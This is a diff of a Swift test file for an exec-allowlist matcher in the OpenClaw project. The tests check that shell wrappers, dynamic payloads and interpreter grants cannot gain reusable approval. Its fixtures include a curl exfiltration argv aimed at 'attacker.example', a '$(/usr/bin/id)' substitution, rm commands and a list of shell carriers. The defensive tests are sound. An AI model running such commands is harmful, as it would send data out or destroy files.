@@ -1,9 +1,9 @@
+import CryptoKit
 import Foundation
 import Testing
 @testable import OpenClaw
 
 /// These cases cover optional `security=allowlist` behavior.
-/// Default install posture remains deny-by-default for exec on macOS node-host.
 struct ExecAllowlistTests {
     private struct ShellParserParityFixture: Decodable {
         struct Case: Decodable {
@@ -40,6 +40,15 @@ struct ExecAllowlistTests {
         return fixture.cases
     }
 
+    private static func hashedArgPattern(_ argv: [String]) -> String {
+        let arguments = Array(argv.dropFirst())
+        let subject = "\(arguments.count)\0" + arguments
+            .map { "\($0.data(using: .utf8)?.count ?? 0)\0\($0)\0" }
+            .joined()
+        let digest = SHA256.hash(data: Data(subject.utf8))
+        return "sha256:argv:" + digest.map { String(format: "%02x", $0) }.joined()
+    }
+
     private static func fixtureURL(filename: String) -> URL {
         var repoRoot = URL(fileURLWithPath: #filePath)
         for _ in 0..<5 {
@@ -57,6 +66,11 @@ struct ExecAllowlistTests {
             resolvedPath: "/opt/homebrew/bin/rg",
             executableName: "rg",
             cwd: nil)
+    }
+
+    private static func makeExecutable(at url: URL, body: String = "#!/bin/sh\nexit 0\n") throws {
+        try Data(body.utf8).write(to: url)
+        try FileManager().setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path)
     }
 
     @Test func `match uses resolved path`() {
@@ -80,6 +94,18 @@ struct ExecAllowlistTests {
         #expect(match?.pattern == entry.pattern)
     }
 
+    @Test func `match never treats durable command markers as executable patterns`() {
+        for marker in ["=command:0123456789abcdef", "=node-command:0123456789abcdef"] {
+            let entry = ExecAllowlistEntry(pattern: marker, source: "allow-always")
+            let resolution = ExecCommandResolution(
+                rawExecutable: marker,
+                resolvedPath: "/Users/test/.local/bin/\(marker)",
+                executableName: marker,
+                cwd: nil)
+            #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) == nil)
+        }
+    }
+
     @Test func `match ignores basename for path selected executable`() {
         let entry = ExecAllowlistEntry(pattern: "echo")
         let relativeResolution = ExecCommandResolution(
@@ -96,11 +122,11 @@ struct ExecAllowlistTests {
         #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: absoluteResolution) == nil)
     }
 
-    @Test func `match is case insensitive`() {
+    @Test func `match is case sensitive on macOS`() {
         let entry = ExecAllowlistEntry(pattern: "/OPT/HOMEBREW/BIN/RG")
         let resolution = Self.homebrewRGResolution()
         let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
-        #expect(match?.pattern == entry.pattern)
+        #expect(match == nil)
     }
 
     @Test func `match supports glob star`() {
@@ -108,6 +134,509 @@ struct ExecAllowlistTests {
         let resolution = Self.homebrewRGResolution()
         let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
         #expect(match?.pattern == entry.pattern)
+    }
+
+    @Test func `single character glob does not cross path separator`() {
+        let entry = ExecAllowlistEntry(pattern: "/tmp/a?b")
+        let resolution = ExecCommandResolution(
+            rawExecutable: "/tmp/a/b",
+            resolvedPath: "/tmp/a/b",
+            resolvedRealPath: "/tmp/a/b",
+            executableName: "b",
+            cwd: nil)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) == nil)
+    }
+
+    @Test func `match normalizes macOS private var alias`() {
+        let entry = ExecAllowlistEntry(pattern: "/var/tmp/openclaw-tool")
+        let resolution = ExecCommandResolution(
+            rawExecutable: "/var/tmp/openclaw-tool",
+            resolvedPath: "/var/tmp/openclaw-tool",
+            resolvedRealPath: "/private/var/tmp/openclaw-tool",
+            executableName: "openclaw-tool",
+            cwd: nil)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) != nil)
+    }
+
+    @Test func `match enforces hand authored arg pattern and prefers it over path only fallback`() {
+        let executable = "/usr/bin/python3"
+        let fallback = ExecAllowlistEntry(id: "fallback", pattern: executable)
+        let restricted = ExecAllowlistEntry(
+            id: "restricted",
+            pattern: executable,
+            argPattern: #"^safe\.py$"#)
+        let safe = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "python3",
+            cwd: nil,
+            argv: [executable, "safe.py"])
+        let unsafe = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "python3",
+            cwd: nil,
+            argv: [executable, "unsafe.py"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [fallback, restricted], resolution: safe)?.id == "restricted")
+        #expect(ExecAllowlistMatcher.match(entries: [fallback, restricted], resolution: unsafe)?.id == "fallback")
+    }
+
+    @Test func `match ignores legacy generated path only allow always entries`() {
+        let executable = "/usr/bin/python3"
+        let legacyGenerated = ExecAllowlistEntry(pattern: executable, source: "allow-always")
+        let manual = ExecAllowlistEntry(pattern: executable)
+        let resolution = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "python3",
+            cwd: nil,
+            argv: [executable, "unsafe.py"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [legacyGenerated], resolution: resolution) == nil)
+        #expect(ExecAllowlistMatcher.match(entries: [manual], resolution: resolution) != nil)
+    }
+
+    @Test func `match enforces generated nul arg patterns including zero args`() {
+        let executable = "/usr/bin/printf"
+        let zeroArgs = ExecAllowlistEntry(pattern: executable, argPattern: "^\0\0$")
+        let oneArg = ExecAllowlistEntry(pattern: executable, argPattern: "^hello world\0$")
+        let base = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "printf",
+            cwd: nil,
+            argv: [executable])
+        let withSpace = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "printf",
+            cwd: nil,
+            argv: [executable, "hello world"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: base) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [oneArg], resolution: withSpace) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: withSpace) == nil)
+    }
+
+    @Test func `match enforces generated hashed arg patterns before regex fallback`() {
+        let executable = "/usr/bin/curl"
+        let approvedArgv = [executable, "https://trusted.example/install.sh"]
+        let entry = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: Self.hashedArgPattern(approvedArgv))
+        let approved = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: approvedArgv)
+        let changed = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: [executable, entry.argPattern ?? "", "https://attacker.example/exfil"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: approved) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: changed) == nil)
+        #expect(entry.argPattern?.contains("trusted.example") == false)
+    }
+
+    @Test func `hashed arg pattern distinguishes zero args from empty args`() {
+        let executable = "/usr/bin/tool"
+        let zeroArgEntry = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: Self.hashedArgPattern([executable]))
+        let noArgs = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "tool",
+            cwd: nil,
+            argv: [executable])
+        let emptyArgs = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "tool",
+            cwd: nil,
+            argv: [executable, "", ""])
+
+        #expect(zeroArgEntry.argPattern != Self.hashedArgPattern([executable, "", ""]))
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: noArgs) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: emptyArgs) == nil)
+    }
+
+    @Test func `arg pattern does not discard redirect shaped direct argv literal`() {
+        let executable = "/usr/bin/python3"
+        let restricted = ExecAllowlistEntry(pattern: executable, argPattern: #"^safe\.py$"#)
+        let explicit = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: #"^safe\.py 2>/dev/null$"#)
+        let resolution = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "python3",
+            cwd: nil,
+            argv: [executable, "safe.py", "2>/dev/null"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [restricted], resolution: resolution) == nil)
+        #expect(ExecAllowlistMatcher.match(entries: [explicit], resolution: resolution)?.pattern == executable)
+    }
+
+    @Test func `arg pattern uses JavaScript regular expression semantics`() {
+        let executable = "/usr/bin/printf"
+        func resolution(_ argument: String) -> ExecCommandResolution {
+            ExecCommandResolution(
+                rawExecutable: executable,
+                resolvedPath: executable,
+                resolvedRealPath: executable,
+                executableName: "printf",
+                cwd: nil,
+                argv: [executable, argument])
+        }
+
+        let digit = ExecAllowlistEntry(pattern: executable, argPattern: #"^\d$"#)
+        #expect(ExecAllowlistMatcher.match(entries: [digit], resolution: resolution("1")) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [digit], resolution: resolution("١")) == nil)
+
+        let word = ExecAllowlistEntry(pattern: executable, argPattern: #"^\w$"#)
+        #expect(ExecAllowlistMatcher.match(entries: [word], resolution: resolution("a")) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [word], resolution: resolution("é")) == nil)
+
+        let anchored = ExecAllowlistEntry(pattern: executable, argPattern: "^safe$")
+        #expect(ExecAllowlistMatcher.match(entries: [anchored], resolution: resolution("safe")) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [anchored], resolution: resolution("safe\n")) == nil)
+
+        for icuOnlyPattern in [#"^a++$"#, #"^(?>a)$"#] {
+            let entry = ExecAllowlistEntry(pattern: executable, argPattern: icuOnlyPattern)
+            #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution("aa")) == nil)
+        }
+    }
+
+    @Test func `arg pattern fails closed without argv or with invalid regex`() {
+        let executable = "/usr/bin/printf"
+        let noArgv = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "printf",
+            cwd: nil)
+        let invalid = ExecAllowlistEntry(pattern: executable, argPattern: "[")
+        let restricted = ExecAllowlistEntry(pattern: executable, argPattern: "^ok$")
+
+        #expect(ExecAllowlistMatcher.match(entries: [invalid], resolution: noArgv) == nil)
+        #expect(ExecAllowlistMatcher.match(entries: [restricted], resolution: noArgv) == nil)
+    }
+
+    @Test func `direct PATH command binds to resolved executable`() throws {
+        let root = FileManager().temporaryDirectory
+            .appendingPathComponent("openclaw-bind-path-\(UUID().uuidString)", isDirectory: true)
+            .resolvingSymlinksInPath()
+        defer { try? FileManager().removeItem(at: root) }
+        try FileManager().createDirectory(at: root, withIntermediateDirectories: true)
+        let executable = root.appendingPathComponent("oc-bind")
+        try Self.makeExecutable(at: executable)
+
+        let command = ["oc-bind", "literal"]
+        let resolutions = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: nil,
+            cwd: nil,
+            env: ["PATH": root.path])
+
+        #expect(resolutions.count == 1)
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: command,
+            rawCommand: nil,
+            resolutions: resolutions) == [executable.path, "literal"])
+    }
+
+    @Test func `symlink allowlist match and execution stay bound to canonical target`() throws {
+        let root = FileManager().temporaryDirectory
+            .appendingPathComponent("openclaw-bind-symlink-\(UUID().uuidString)", isDirectory: true)
+            .resolvingSymlinksInPath()
+        defer { try? FileManager().removeItem(at: root) }
+        try FileManager().createDirectory(at: root, withIntermediateDirectories: true)
+        let first = root.appendingPathComponent("first")
+        let second = root.appendingPathComponent("second")
+        let alias = root.appendingPathComponent("tool")
+        try Self.makeExecutable(at: first)
+        try Self.makeExecutable(at: second)
+        try FileManager().createSymbolicLink(at: alias, withDestinationURL: first)
+
+        let command = [alias.path, "value"]
+        let resolutions = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: nil,
+            cwd: nil,
+            env: nil)
+        let resolution = try #require(resolutions.first)
+        let targetEntry = ExecAllowlistEntry(pattern: first.path)
+        let aliasEntry = ExecAllowlistEntry(pattern: alias.path)
+        let bound = ExecCommandResolution.bindForAllowlistExecution(
+            command: command,
+            rawCommand: nil,
+            resolutions: resolutions)
+
+        #expect(ExecAllowlistMatcher.match(entries: [targetEntry], resolution: resolution) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [aliasEntry], resolution: resolution) == nil)
+        #expect(bound == [first.path, "value"])
+
+        try FileManager().removeItem(at: alias)
+        try FileManager().createSymbolicLink(at: alias, withDestinationURL: second)
+        #expect(bound == [first.path, "value"])
+    }
+
+    @Test func `standard non-login sh transport binds one static command directly`() {
+        let payload = "/usr/bin/printf 'literal value'"
+        let command = ["/bin/sh", "-c", payload]
+        let resolutions = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: payload,
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: command,
+            rawCommand: payload,
+            resolutions: resolutions) == ["/usr/bin/printf", "literal value"])
+    }
+
+    @Test func `login sh transport remains one-shot because startup files are outside the binding`() {
+        let payload = "/usr/bin/printf 'literal value'"
+        let command = ["/bin/sh", "-lc", payload]
+        let resolutions = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: payload,
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: command,
+            rawCommand: payload,
+            resolutions: resolutions) == nil)
+    }
+
+    @Test func `nonstandard shell wrappers never receive reusable execution binding`() {
+        let cases: [([String], String?)] = [
+            (["/bin/sh", "-n", "-c", "/bin/rm /tmp/x"], "/bin/rm /tmp/x"),
+            (["fish", "-c", "/usr/bin/printf literal"], nil),
+            (["cmd", "/c", "/usr/bin/printf literal"], nil),
+            (["pwsh", "-command", "/usr/bin/printf literal"], nil),
+        ]
+
+        for (command, rawCommand) in cases {
+            let resolutions = ExecCommandResolution.resolveForAllowlist(
+                command: command,
+                rawCommand: rawCommand,
+                cwd: nil,
+                env: ["PATH": "/usr/bin:/bin"])
+            #expect(!resolutions.isEmpty)
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: rawCommand,
+                resolutions: resolutions) == nil)
+        }
+    }
+
+    @Test func `shell carriers and canonical shell aliases cannot bind`() {
+        let directPath = "/usr/bin/true"
+        for carrier in [
+            "ash", "bash", "chrt", "cmd", "cmd.exe", "dash", "fish", "ionice", "ksh", "powershell",
+            "powershell.exe", "pwsh", "pwsh.exe", "setsid", "sh", "taskset", "zsh",
+        ] {
+            let command = [carrier, "/tmp/unsafe-script"]
+            let resolution = ExecCommandResolution(
+                rawExecutable: carrier,
+                resolvedPath: directPath,
+                resolvedRealPath: directPath,
+                executableName: carrier,
+                cwd: nil,
+                argv: command)
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: nil,
+                resolutions: [resolution]) == nil)
+        }
+
+        let aliasCommand = ["skill-shell", "-c", "/usr/bin/printf ok"]
+        let aliasResolution = ExecCommandResolution(
+            rawExecutable: "skill-shell",
+            resolvedPath: "/tmp/skill-shell",
+            resolvedRealPath: "/bin/sh",
+            executableName: "skill-shell",
+            cwd: nil,
+            argv: aliasCommand)
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: aliasCommand,
+            rawCommand: nil,
+            resolutions: [aliasResolution]) == nil)
+    }
+
+    @Test func `shell tokenization uses shell lexical separators only`() throws {
+        for separator in ["\u{00A0}", "\u{2003}", "\r"] {
+            let argument = "left\(separator)right\(separator)"
+            let payload = "/usr/bin/printf \(argument)"
+            let command = ["/bin/sh", "-c", payload]
+            let resolutions = ExecCommandResolution.resolveForAllowlist(
+                command: command,
+                rawCommand: payload,
+                cwd: nil,
+                env: ["PATH": "/usr/bin:/bin"])
+            let resolution = try #require(resolutions.first)
+
+            #expect(resolution.argv == ["/usr/bin/printf", argument])
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: payload,
+                resolutions: resolutions) == ["/usr/bin/printf", argument])
+        }
+
+        let tabPayload = "/usr/bin/printf left\tright"
+        let tabResolution = try #require(ExecCommandResolution.resolveForAllowlist(
+            command: ["/bin/sh", "-c", tabPayload],
+            rawCommand: tabPayload,
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"]).first)
+        #expect(tabResolution.argv == ["/usr/bin/printf", "left", "right"])
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: ["/bin/sh", "-c", tabPayload],
+            rawCommand: tabPayload,
+            resolutions: [tabResolution]) == ["/usr/bin/printf", "left", "right"])
+    }
+
+    @Test func `dynamic shell payloads cannot receive reusable binding`() {
+        for payload in [
+            "/usr/bin/printf $HOME",
+            "/usr/bin/printf $(/usr/bin/id)",
+            "/usr/bin/printf *",
+            "/usr/bin/printf ok > /tmp/out",
+            "/usr/bin/printf ok && /usr/bin/true",
+            "FOO=bar /usr/bin/printf ok",
+            "/usr/bin/printf ok # ignored",
+        ] {
+            let command = ["/bin/sh", "-lc", payload]
+            let resolutions = ExecCommandResolution.resolveForAllowlist(
+                command: command,
+                rawCommand: payload,
+                cwd: nil,
+                env: ["PATH": "/usr/bin:/bin"])
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: payload,
+                resolutions: resolutions) == nil)
+        }
+
+        let assignmentPayload = "FOO=bar /usr/bin/printf ok"
+        let spoofedAssignmentResolution = ExecCommandResolution(
+            rawExecutable: "FOO=bar",
+            resolvedPath: "/usr/bin/true",
+            resolvedRealPath: "/usr/bin/true",
+            executableName: "true",
+            cwd: nil,
+            argv: ["FOO=bar", "/usr/bin/printf", "ok"])
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: ["/bin/sh", "-lc", assignmentPayload],
+            rawCommand: assignmentPayload,
+            resolutions: [spoofedAssignmentResolution]) == nil)
+    }
+
+    @Test func `env empty utility operands cannot receive reusable binding`() {
+        for command in [
+            ["/usr/bin/env", "", "/usr/bin/touch", "/tmp/x"],
+            ["/usr/bin/env", "--", "   ", "/usr/bin/touch", "/tmp/x"],
+        ] {
+            #expect(ExecEnvInvocationUnwrapper.unwrapWithMetadata(command) == nil)
+            let resolutions = ExecCommandResolution.resolveForAllowlist(
+                command: command,
+                rawCommand: nil,
+                cwd: nil,
+                env: ["PATH": "/usr/bin:/bin"])
+            #expect(resolutions.first?.executableName == "env")
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: nil,
+                resolutions: resolutions) == nil)
+        }
+    }
+
+    @Test func `env clear environment marker is not transparent`() throws {
+        let clearCommand = ["/usr/bin/env", "-", "/usr/bin/true"]
+        let clear = try #require(ExecEnvInvocationUnwrapper.unwrapWithMetadata(clearCommand))
+        #expect(clear.usesModifiers)
+        let clearResolutions = ExecCommandResolution.resolveForAllowlist(
+            command: clearCommand,
+            rawCommand: nil,
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+        #expect(clearResolutions.first?.executableName == "env")
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: clearCommand,
+            rawCommand: nil,
+            resolutions: clearResolutions) == nil)
+
+        let separatorCommand = ["/usr/bin/env", "--", "/usr/bin/true"]
+        let separator = try #require(ExecEnvInvocationUnwrapper.unwrapWithMetadata(separatorCommand))
+        #expect(!separator.usesModifiers)
+        #expect(separator.command == ["/usr/bin/true"])
+    }
+
+    @Test func `non shell allowlist resolution ignores display text`() {
+        let command = ["/usr/bin/env", "/usr/bin/printf", "ok"]
+        let withoutDisplay = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: nil,
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+        let withDisplay = ExecCommandResolution.resolveForAllowlist(
+            command: command,
+            rawCommand: "/usr/bin/env /usr/bin/printf ok",
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+
+        #expect(withDisplay.map(\.rawExecutable) == withoutDisplay.map(\.rawExecutable))
+        #expect(withDisplay.first?.resolvedRealPath == "/usr/bin/printf")
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: command,
+            rawCommand: "/usr/bin/env /usr/bin/printf ok",
+            resolutions: withDisplay) == ["/usr/bin/printf", "ok"])
+    }
+
+    @Test func `shell comments and dispatch wrappers cannot receive reusable binding`() {
+        let commented = ["/bin/sh", "-c", "/bin/rm /tmp/safe # /tmp/protected"]
+        let commentedResolutions = ExecCommandResolution.resolveForAllowlist(
+            command: commented,
+            rawCommand: "/bin/rm /tmp/safe # /tmp/protected",
+            cwd: nil,
+            env: ["PATH": "/usr/bin:/bin"])
+        #expect(ExecCommandResolution.bindForAllowlistExecution(
+            command: commented,
+            rawCommand: "/bin/rm /tmp/safe # /tmp/protected",
+            resolutions: commentedResolutions) == nil)
+
+        for command in [
+            ["/usr/bin/nice", "/usr/bin/printf", "ok"],
+            ["/bin/sh", "./script.sh"],
+            ["npx", "some-package"],
+        ] {
+            let resolutions = ExecCommandResolution.resolveForAllowlist(
+                command: command,
+                rawCommand: nil,
+                cwd: "/tmp",
+                env: ["PATH": "/usr/bin:/bin"])
+            #expect(ExecCommandResolution.bindForAllowlistExecution(
+                command: command,
+                rawCommand: nil,
+                resolutions: resolutions) == nil)
+        }
     }
 
     @Test func `resolve for allowlist splits shell chains`() {
@@ -458,6 +987,21 @@ struct ExecAllowlistTests {
         #expect(evaluation.allowlistResolutions.count == 1)
         #expect(evaluation.allowlistResolutions[0].resolvedPath == "/usr/bin/printf")
         #expect(evaluation.allowlistResolutions[0].executableName == "printf")
+        #expect(evaluation.boundCommand == ["/usr/bin/printf", "ok"])
+    }
+
+    @Test func `approval evaluator keeps login shell requests non-reusable`() async {
+        let rawCommand = "/usr/bin/printf safe"
+        let evaluation = await ExecApprovalEvaluator.evaluate(
+            command: ["/bin/sh", "-lc", rawCommand],
+            rawCommand: rawCommand,
+            cwd: nil,
+            envOverrides: ["PATH": "/usr/bin:/bin"],
+            agentId: nil)
+
+        #expect(evaluation.boundCommand == nil)
+        #expect(!evaluation.allowlistSatisfied)
+        #expect(!evaluation.canPersistAllowAlways)
     }
 
     @Test func `allow always patterns unwrap env wrapper modifiers to the inner executable`() {
@@ -466,7 +1010,8 @@ struct ExecAllowlistTests {
             cwd: nil,
             env: ["PATH": "/usr/bin:/bin"])
 
-        #expect(patterns == ["/usr/bin/printf"])
+        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
+        #expect(patterns.first?.argPattern?.hasPrefix("sha256:argv:") == true)
     }
 
     @Test func `allow always patterns fail closed for env modified shell wrappers`() {
@@ -492,7 +1037,30 @@ struct ExecAllowlistTests {
             env: ["PATH": "/usr/bin:/bin"],
             rawCommand: "/usr/bin/printf safe_marker")
 
-        #expect(patterns == ["/usr/bin/printf"])
+        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
+        #expect(patterns.first?.argPattern == Self.hashedArgPattern(["/usr/bin/printf", "safe_marker"]))
+    }
+
+    @Test func `allow always never persists broad interpreter grants`() {
+        for executable in [
+            "awk", "find", "gawk", "gmake", "gsed", "node", "osascript", "perl", "php",
+            "python3.13", "Rscript", "ruby", "sed", "xargs",
+        ] {
+            let patterns = ExecCommandResolution.resolveAllowAlwaysPatterns(
+                command: [executable, "inline-program"],
+                cwd: nil,
+                env: ["PATH": "/usr/bin:/bin"])
+            #expect(patterns.isEmpty)
+        }
+
+        let r2 = ExecCommandResolution(
+            rawExecutable: "r2",
+            resolvedPath: "/usr/local/bin/r2",
+            resolvedRealPath: "/usr/local/bin/r2",
+            executableName: "r2",
+            cwd: nil,
+            argv: ["r2"])
+        #expect(!ExecCommandResolution.isInterpreterLikePersistentGrantTarget(r2))
     }
 
     @Test func `match all requires every segment to match`() {
@@ -513,8 +1081,13 @@ struct ExecAllowlistTests {
             resolutions: resolutions)
         #expect(partial.isEmpty)
 
-        let full = ExecAllowlistMatcher.matchAll(
+        let caseMismatch = ExecAllowlistMatcher.matchAll(
             entries: [ExecAllowlistEntry(pattern: "/USR/BIN/ECHO"), ExecAllowlistEntry(pattern: "/usr/bin/touch")],
+            resolutions: resolutions)
+        #expect(caseMismatch.isEmpty)
+
+        let full = ExecAllowlistMatcher.matchAll(
+            entries: [ExecAllowlistEntry(pattern: "/usr/bin/echo"), ExecAllowlistEntry(pattern: "/usr/bin/touch")],
             resolutions: resolutions)
         #expect(full.count == 2)
     }
